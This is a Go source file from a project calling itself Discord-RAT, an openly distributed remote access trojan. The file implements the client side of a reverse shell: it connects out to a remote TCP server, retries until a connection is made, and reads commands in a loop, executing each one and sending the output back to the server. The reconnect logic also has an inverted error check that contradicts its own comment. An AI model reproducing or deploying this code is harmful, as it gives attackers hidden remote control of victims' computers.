/*
 * This file is part of the Discord-RAT project.
 * Repository: https://github.com/codeuk/discord-rat
 *
 * Written by codeuk (github.com/codeuk)
 *
 * Discord-RAT is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Discord-RAT is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Discord-RAT. If not, see <https://www.gnu.org/licenses/>.
 */
package system

import (
	"bufio"
	"fmt"
	"net"
	"time"
)

// Server represents the TCP server to connect with.
type Server struct {
	Host string
	Port string
}

// ClientSocket represents the established connection (TCP) with a parent server.
type ClientSocket struct {
	Server Server
	Conn   net.Conn
}

var (
	// Command and connection timeouts (how long to wait before retrying when they disconnect/error).
	CommandTimeout    = time.Second * 3 // Default: 3 seconds
	ConnectionTimeout = time.Second * 5 // Default: 5 seconds

	// Server connection request counter.
	// This is used for checking if the MAX_CONNECTION_ATTEMPTS has been reached.
	ConnectionAttempts int
)

// Connect connects to the supplied TCP server (Server).
func Connect(server Server) (*ClientSocket, error) {
	ConnectionAttempts++

	// Format the Server Host and Port to fit the TCP addr format.
	addr := server.Host + ":" + server.Port

	// Continue trying until a connection is established.
	for {
		conn, err := net.Dial("tcp", addr)

		// Couldn't connect to the supplied TCP server.
		if err != nil {
			if ConnectionAttempts >= MAX_CONNECTION_ATTEMPTS {
				// We've reached the maximum attempts so just return an error stating so.
				return nil, fmt.Errorf("failed to connect to the passed server within MAX_CONNECTION_ATTEMPTS")
			}

			if conn != nil {
				// If it exists, close the current connection before retrying.
				conn.Close()
			}

			// Wait for the set connection timeout before re-establishing the connection.
			time.Sleep(ConnectionTimeout)
			continue
		}

		// Return a new ClientSocket instance containing the established TCP connection.
		return &ClientSocket{
			Server: server,
			Conn:   conn,
		}, nil
	}
}

// Listen listens for, executes and sends the output of commands sent from the server back to it.
func (client *ClientSocket) Listen() {
	for {
		// Listen for incoming commands from the server.
		buffReader := bufio.NewReader(client.Conn)

		// Read the command from the server (using '\n' as the splitter).
		command, err := buffReader.ReadString('\n')
		if err != nil {
			client.Conn.Close()
			time.Sleep(CommandTimeout)
			newClient, err := Connect(client.Server) // Attempt to re-establish the connection.
			if err != nil {
				// If the connection attempt was successful.
				client = newClient // Update the client to use the new connection.
				continue           // Start loop again with the new connection.
			}
		}

		// Execute the received command and store the output.
		output := ExecuteCommand(command)

		// Send the execution output back to the server.
		client.Conn.Write([]byte(output))
	}
}

// Maximium attempts allowed to try and connect to a Server before returning.
const MAX_CONNECTION_ATTEMPTS = 3
